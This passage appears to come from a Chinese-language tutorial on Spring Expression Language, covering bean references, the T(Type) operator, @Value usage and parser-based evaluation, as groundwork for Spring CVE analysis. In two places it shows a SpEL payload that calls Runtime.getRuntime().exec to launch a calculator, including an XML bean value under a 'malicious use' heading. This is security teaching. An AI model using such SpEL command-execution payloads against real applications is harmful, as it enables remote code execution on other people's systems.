<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/><span style="height: 20px;line-height: 20px;">3</span><br/><span style="height: 20px;line-height: 20px;">4</span><br/><span style="height: 20px;line-height: 20px;">5</span><br/><span style="height: 20px;line-height: 20px;">6</span><br/><span style="height: 20px;line-height: 20px;">7</span><br/><span style="height: 20px;line-height: 20px;">8</span><br/><span style="height: 20px;line-height: 20px;">9</span><br/><span style="height: 20px;line-height: 20px;">10</span><br/><span style="height: 20px;line-height: 20px;">11</span><br/><span style="height: 20px;line-height: 20px;">12</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">package</span> com.mi1k7ea;</span><br/><span style="height: 20px;line-height: 20px;"></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">public</span> <span style="color: rgb(41, 115, 183);"><span style="color: rgb(233, 105, 0);">class</span> TextEditor </span>{</span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(233, 105, 0);">private</span> SpellChecker spellChecker;</span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(82, 82, 82);"><span style="color: rgb(0, 146, 219);">public</span> TextEditor(SpellChecker spellChecker) </span>{</span><br/><span style="height: 20px;line-height: 20px;">        System.out.println(<span style="color: rgb(26, 188, 156);">&#34;Inside TextEditor constructor.&#34;</span> );</span><br/><span style="height: 20px;line-height: 20px;">        <span style="color: rgb(233, 105, 0);">this</span>.spellChecker = spellChecker;</span><br/><span style="height: 20px;line-height: 20px;">    }</span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(82, 82, 82);"><span style="color: rgb(0, 146, 219);">public</span> <span style="color: rgb(0, 146, 219);">void</span> spellCheck() </span>{</span><br/><span style="height: 20px;line-height: 20px;">        spellChecker.checkSpelling();</span><br/><span style="height: 20px;line-height: 20px;">    }</span><br/><span style="height: 20px;line-height: 20px;">}</span><br/></pre></td></tr></tbody></table>  
MainApp.java：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/><span style="height: 20px;line-height: 20px;">3</span><br/><span style="height: 20px;line-height: 20px;">4</span><br/><span style="height: 20px;line-height: 20px;">5</span><br/><span style="height: 20px;line-height: 20px;">6</span><br/><span style="height: 20px;line-height: 20px;">7</span><br/><span style="height: 20px;line-height: 20px;">8</span><br/><span style="height: 20px;line-height: 20px;">9</span><br/><span style="height: 20px;line-height: 20px;">10</span><br/><span style="height: 20px;line-height: 20px;">11</span><br/><span style="height: 20px;line-height: 20px;">12</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">package</span> com.mi1k7ea;</span><br/><span style="height: 20px;line-height: 20px;"></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">import</span> org.springframework.context.ApplicationContext;</span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br/><span style="height: 20px;line-height: 20px;"></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">public</span> <span style="color: rgb(41, 115, 183);"><span style="color: rgb(233, 105, 0);">class</span> MainApp </span>{</span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(82, 82, 82);"><span style="color: rgb(0, 146, 219);">public</span> <span style="color: rgb(0, 146, 219);">static</span> <span style="color: rgb(0, 146, 219);">void</span> main(String[] args) </span>{</span><br/><span style="height: 20px;line-height: 20px;">        ApplicationContext context = <span style="color: rgb(233, 105, 0);">new</span> ClassPathXmlApplicationContext(<span style="color: rgb(26, 188, 156);">&#34;Beans.xml&#34;</span>);</span><br/><span style="height: 20px;line-height: 20px;">        TextEditor te = (TextEditor) context.getBean(<span style="color: rgb(26, 188, 156);">&#34;textEditor&#34;</span>);</span><br/><span style="height: 20px;line-height: 20px;">        te.spellCheck();</span><br/><span style="height: 20px;line-height: 20px;">    }</span><br/><span style="height: 20px;line-height: 20px;">}</span><br/></pre></td></tr></tbody></table>  
Beans.xml，通过value="#{bean id}"的方式替换掉之前的ref属性设置：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/><span style="height: 20px;line-height: 20px;">3</span><br/><span style="height: 20px;line-height: 20px;">4</span><br/><span style="height: 20px;line-height: 20px;">5</span><br/><span style="height: 20px;line-height: 20px;">6</span><br/><span style="height: 20px;line-height: 20px;">7</span><br/><span style="height: 20px;line-height: 20px;">8</span><br/><span style="height: 20px;line-height: 20px;">9</span><br/><span style="height: 20px;line-height: 20px;">10</span><br/><span style="height: 20px;line-height: 20px;">11</span><br/><span style="height: 20px;line-height: 20px;">12</span><br/><span style="height: 20px;line-height: 20px;">13</span><br/><span style="height: 20px;line-height: 20px;">14</span><br/><span style="height: 20px;line-height: 20px;">15</span><br/><span style="height: 20px;line-height: 20px;">16</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;"><span style="color: rgb(179, 179, 179);">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">beans</span> xmlns=<span style="color: rgb(26, 188, 156);">&#34;http://www.springframework.org/schema/beans&#34;</span></span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">       xmlns:xsi=<span style="color: rgb(26, 188, 156);">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span></span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">       xsi:schemaLocation=<span style="color: rgb(26, 188, 156);">&#34;http://www.springframework.org/schema/beans</span></span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);"><span style="color: rgb(26, 188, 156);">    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd &#34;</span>&gt;</span></span><br/><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(179, 179, 179);">&lt;!-- Definition for textEditor bean --&gt;</span></span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">bean</span> id=<span style="color: rgb(26, 188, 156);">&#34;textEditor&#34;</span> class=<span style="color: rgb(26, 188, 156);">&#34;com.mi1k7ea.TextEditor&#34;</span>&gt;</span></span><br/><span style="height: 20px;line-height: 20px;">        <span style="color: rgb(179, 179, 179);">&lt;!--&lt;constructor-arg ref=&#34;spellChecker&#34;/&gt;--&gt;</span></span><br/><span style="height: 20px;line-height: 20px;">        <span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">constructor-arg</span> value=<span style="color: rgb(26, 188, 156);">&#34;#{spellChecker}&#34;</span>/&gt;</span></span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(41, 115, 183);">&lt;/<span style="color: rgb(82, 82, 82);">bean</span>&gt;</span></span><br/><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(179, 179, 179);">&lt;!-- Definition for spellChecker bean --&gt;</span></span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">bean</span> id=<span style="color: rgb(26, 188, 156);">&#34;spellChecker&#34;</span> class=<span style="color: rgb(26, 188, 156);">&#34;com.mi1k7ea.SpellChecker&#34;</span> /&gt;</span></span><br/><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">&lt;/<span style="color: rgb(82, 82, 82);">beans</span>&gt;</span></span><br/></pre></td></tr></tbody></table>  
运行输出：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/><span style="height: 20px;line-height: 20px;">3</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;">Inside SpellChecker constructor.</span><br/><span style="height: 20px;line-height: 20px;">Inside TextEditor constructor.</span><br/><span style="height: 20px;line-height: 20px;">Inside checkSpelling.</span><br/></pre></td></tr></tbody></table>### 类类型表达式T(Type)  
  
在SpEL表达式中，使用T(Type)运算符会调用类的作用域和方法。换句话说，就是可以通过该类类型表达式来操作类。  
  
使用T(Type)来表示java.lang.Class实例，Type必须是类全限定名，但”java.lang”包除外，因为SpEL已经内置了该包，即该包下的类可以不指定具体的包名；使用类类型表达式还可以进行访问类静态方法和类静态字段。  
  
在XML配置文件中的使用示例，要调用java.lang.Math来获取0~1的随机数：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">property</span> name=<span style="color: rgb(26, 188, 156);">&#34;random&#34;</span> value=<span style="color: rgb(26, 188, 156);">&#34;#{T(java.lang.Math).random()}&#34;</span>/&gt;</span></span><br/></pre></td></tr></tbody></table>  
Expression中使用示例：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/><span style="height: 20px;line-height: 20px;">3</span><br/><span style="height: 20px;line-height: 20px;">4</span><br/><span style="height: 20px;line-height: 20px;">5</span><br/><span style="height: 20px;line-height: 20px;">6</span><br/><span style="height: 20px;line-height: 20px;">7</span><br/><span style="height: 20px;line-height: 20px;">8</span><br/><span style="height: 20px;line-height: 20px;">9</span><br/><span style="height: 20px;line-height: 20px;">10</span><br/><span style="height: 20px;line-height: 20px;">11</span><br/><span style="height: 20px;line-height: 20px;">12</span><br/><span style="height: 20px;line-height: 20px;">13</span><br/><span style="height: 20px;line-height: 20px;">14</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;">ExpressionParser parser = <span style="color: rgb(233, 105, 0);">new</span> SpelExpressionParser();</span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(179, 179, 179);">// java.lang 包类访问</span></span><br/><span style="height: 20px;line-height: 20px;">Class&lt;String&gt; result1 = parser.parseExpression(<span style="color: rgb(26, 188, 156);">&#34;T(String)&#34;</span>).getValue(Class.class);</span><br/><span style="height: 20px;line-height: 20px;">System.out.println(result1);</span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(179, 179, 179);">//其他包类访问</span></span><br/><span style="height: 20px;line-height: 20px;">String expression2 = <span style="color: rgb(26, 188, 156);">&#34;T(java.lang.Runtime).getRuntime().exec(&#39;open /Applications/Calculator.app&#39;)&#34;</span>;</span><br/><span style="height: 20px;line-height: 20px;">Class&lt;Object&gt; result2 = parser.parseExpression(expression2).getValue(Class.class);</span><br/><span style="height: 20px;line-height: 20px;">System.out.println(result2);</span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(179, 179, 179);">//类静态字段访问</span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">int</span> result3 = parser.parseExpression(<span style="color: rgb(26, 188, 156);">&#34;T(Integer).MAX_VALUE&#34;</span>).getValue(<span style="color: rgb(233, 105, 0);">int</span>.class);</span><br/><span style="height: 20px;line-height: 20px;">System.out.println(result3);</span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(179, 179, 179);">//类静态方法调用</span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">int</span> result4 = parser.parseExpression(<span style="color: rgb(26, 188, 156);">&#34;T(Integer).parseInt(&#39;1&#39;)&#34;</span>).getValue(<span style="color: rgb(233, 105, 0);">int</span>.class);</span><br/><span style="height: 20px;line-height: 20px;">System.out.println(result4);</span><br/></pre></td></tr></tbody></table>#### Demo  
  
在前面字面值的Demo中修改Beans.xml即可：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/><span style="height: 20px;line-height: 20px;">3</span><br/><span style="height: 20px;line-height: 20px;">4</span><br/><span style="height: 20px;line-height: 20px;">5</span><br/><span style="height: 20px;line-height: 20px;">6</span><br/><span style="height: 20px;line-height: 20px;">7</span><br/><span style="height: 20px;line-height: 20px;">8</span><br/><span style="height: 20px;line-height: 20px;">9</span><br/><span style="height: 20px;line-height: 20px;">10</span><br/><span style="height: 20px;line-height: 20px;">11</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;"><span style="color: rgb(179, 179, 179);">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">beans</span> xmlns=<span style="color: rgb(26, 188, 156);">&#34;http://www.springframework.org/schema/beans&#34;</span></span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">       xmlns:xsi=<span style="color: rgb(26, 188, 156);">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span></span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">       xsi:schemaLocation=<span style="color: rgb(26, 188, 156);">&#34;http://www.springframework.org/schema/beans</span></span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);"><span style="color: rgb(26, 188, 156);">    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd &#34;</span>&gt;</span></span><br/><span style="height: 20px;line-height: 20px;"></span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">bean</span> id=<span style="color: rgb(26, 188, 156);">&#34;helloWorld&#34;</span> class=<span style="color: rgb(26, 188, 156);">&#34;com.mi1k7ea.HelloWorld&#34;</span>&gt;</span></span><br/><span style="height: 20px;line-height: 20px;">        <span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">property</span> name=<span style="color: rgb(26, 188, 156);">&#34;message&#34;</span> value=<span style="color: rgb(26, 188, 156);">&#34;#{T(java.lang.Math).random()}&#34;</span> /&gt;</span></span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(41, 115, 183);">&lt;/<span style="color: rgb(82, 82, 82);">bean</span>&gt;</span></span><br/><span style="height: 20px;line-height: 20px;"></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">&lt;/<span style="color: rgb(82, 82, 82);">beans</span>&gt;</span></span><br/></pre></td></tr></tbody></table>  
运行输出随机值：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;">Your Message : 0.7593490190723996</span><br/></pre></td></tr></tbody></table>#### 恶意利用——弹计算器  
  
修改value中类类型表达式的类为Runtime并调用其命令执行方法即可：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/><span style="height: 20px;line-height: 20px;">3</span><br/><span style="height: 20px;line-height: 20px;">4</span><br/><span style="height: 20px;line-height: 20px;">5</span><br/><span style="height: 20px;line-height: 20px;">6</span><br/><span style="height: 20px;line-height: 20px;">7</span><br/><span style="height: 20px;line-height: 20px;">8</span><br/><span style="height: 20px;line-height: 20px;">9</span><br/><span style="height: 20px;line-height: 20px;">10</span><br/><span style="height: 20px;line-height: 20px;">11</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;"><span style="color: rgb(179, 179, 179);">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">beans</span> xmlns=<span style="color: rgb(26, 188, 156);">&#34;http://www.springframework.org/schema/beans&#34;</span></span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">       xmlns:xsi=<span style="color: rgb(26, 188, 156);">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span></span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">       xsi:schemaLocation=<span style="color: rgb(26, 188, 156);">&#34;http://www.springframework.org/schema/beans</span></span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);"><span style="color: rgb(26, 188, 156);">    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd &#34;</span>&gt;</span></span><br/><span style="height: 20px;line-height: 20px;"></span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">bean</span> id=<span style="color: rgb(26, 188, 156);">&#34;helloWorld&#34;</span> class=<span style="color: rgb(26, 188, 156);">&#34;com.mi1k7ea.HelloWorld&#34;</span>&gt;</span></span><br/><span style="height: 20px;line-height: 20px;">        <span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">property</span> name=<span style="color: rgb(26, 188, 156);">&#34;message&#34;</span> value=<span style="color: rgb(26, 188, 156);">&#34;#{T(java.lang.Runtime).getRuntime().exec(&#39;calc&#39;)}&#34;</span> /&gt;</span></span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(41, 115, 183);">&lt;/<span style="color: rgb(82, 82, 82);">bean</span>&gt;</span></span><br/><span style="height: 20px;line-height: 20px;"></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">&lt;/<span style="color: rgb(82, 82, 82);">beans</span>&gt;</span></span><br/></pre></td></tr></tbody></table>  
运行即可弹计算器。  
### SpEL用法  
  
SpEL的用法有三种形式，一种是在注解@Value中；一种是XML配置；最后一种是在代码块中使用Expression。  
  
前面的就是以XML配置为例对SpEL表达式的用法进行的说明，而注解@Value的用法例子如下：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/><span style="height: 20px;line-height: 20px;">3</span><br/><span style="height: 20px;line-height: 20px;">4</span><br/><span style="height: 20px;line-height: 20px;">5</span><br/><span style="height: 20px;line-height: 20px;">6</span><br/><span style="height: 20px;line-height: 20px;">7</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">public</span> <span style="color: rgb(41, 115, 183);"><span style="color: rgb(233, 105, 0);">class</span> EmailSender </span>{</span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(179, 179, 179);">@Value</span>(<span style="color: rgb(26, 188, 156);">&#34;${spring.mail.username}&#34;</span>)</span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(233, 105, 0);">private</span> String mailUsername;</span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(179, 179, 179);">@Value</span>(<span style="color: rgb(26, 188, 156);">&#34;#{ systemProperties[&#39;user.region&#39;] }&#34;</span>)    </span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(233, 105, 0);">private</span> String defaultLocale;</span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(179, 179, 179);">//...</span></span><br/><span style="height: 20px;line-height: 20px;">}</span><br/></pre></td></tr></tbody></table>  
下面具体看下Expression的。  
#### Expression用法  
  
由于后续分析的各种Spring CVE漏洞都是基于Expression形式的SpEL表达式注入，因此这里再单独说明SpEL表达式Expression这种形式的用法。  
##### 步骤  
> SpEL 在求表达式值时一般分为四步，其中第三步可选：首先构造一个解析器，其次解析器解析字符串表达式，在此构造上下文，最后根据上下文得到表达式运算后的值。  
  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/><span style="height: 20px;line-height: 20px;">3</span><br/><span style="height: 20px;line-height: 20px;">4</span><br/><span style="height: 20px;line-height: 20px;">5</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;">ExpressionParser parser = <span style="color: rgb(233, 105, 0);">new</span> SpelExpressionParser();</span><br/><span style="height: 20px;line-height: 20px;">Expression expression = parser.parseExpression(<span style="color: rgb(26, 188, 156);">&#34;(&#39;Hello&#39; + &#39; Mi1k7ea&#39;).concat(#end)&#34;</span>);</span><br/><span style="height: 20px;line-height: 20px;">EvaluationContext context = <span style="color: rgb(233, 105, 0);">new</span> StandardEvaluationContext();</span><br/><span style="height: 20px;line-height: 20px;">context.setVariable(<span style="color: rgb(26, 188, 156);">&#34;end&#34;</span>, <span style="color: rgb(26, 188, 156);">&#34;!&#34;</span>);</span><br/><span style="height: 20px;line-height: 20px;">System.out.println(expression.getValue(context));</span><br/></pre></td></tr></tbody></table>  
具体步骤如下：  
1. 创建解析器：SpEL 使用 ExpressionParser 接口表示解析器，提供 SpelExpressionParser 默认实现；  
  
1. 解析表达式：使用 ExpressionParser 的 parseExpression 来解析相应的表达式为 Expression 对象；  
  
1. 构造上下文：准备比如变量定义等等表达式需要的上下文数据；  
  
1. 求值：通过 Expression 接口的 getValue 方法根据上下文获得表达式值；  
  
##### 主要接口  
